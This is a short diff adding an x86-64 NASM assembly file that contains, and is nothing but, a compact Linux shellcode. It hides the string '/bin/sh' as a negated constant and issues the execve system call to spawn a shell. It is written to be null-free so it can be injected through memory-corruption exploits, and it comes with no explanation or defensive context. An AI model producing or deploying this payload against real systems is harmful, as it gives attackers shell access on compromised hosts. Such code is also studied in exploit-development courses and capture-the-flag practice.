@@ -1,0 +1,17 @@
+BITS 64
+section .text
+global _start
+_start:
+    xor eax,eax
+    mov rbx,0xff978cd091969dd1
+    neg rbx
+    push rbx
+    push rsp
+    pop rdi
+    cdq
+    push rdx
+    push rdi
+    push rsp
+    pop rsi
+    mov al,0x3b
+    syscall
